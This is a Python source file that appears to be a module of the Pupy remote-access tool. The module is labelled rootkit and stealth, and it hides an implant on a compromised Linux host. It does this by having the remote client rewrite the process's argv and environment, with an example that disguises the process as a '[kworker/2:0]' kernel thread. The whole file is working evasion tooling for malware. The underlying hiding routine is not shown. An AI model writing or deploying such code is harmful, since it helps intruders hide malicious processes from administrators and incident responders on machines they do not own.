# -*- coding: utf-8 -*-

from pupylib.PupyModule import config, PupyModule, PupyArgumentParser

__class_name__ = "HideProcessModule"


@config(compat="linux", cat="manage", tags=["hide", "rootkit", "stealth"])
class HideProcessModule(PupyModule):
    """ Edit current process argv & env not to look suspicious """

    dependencies = ["hide_process"]

    @classmethod
    def init_argparse(cls):
        example = 'Example:\n'
        example += '>> hide_process --argv "[kworker/2:0]"\n'

        cls.arg_parser = PupyArgumentParser(prog="hide_process", description=cls.__doc__, epilog=example)
        cls.arg_parser.add_argument('--argv', default="/bin/bash", help='change the new process argv')

    def run(self, args):
        change_argv = self.client.remote('hide_process', 'change_argv')
        change_argv(argv=args.argv)
        self.success("process argv and env changed !")
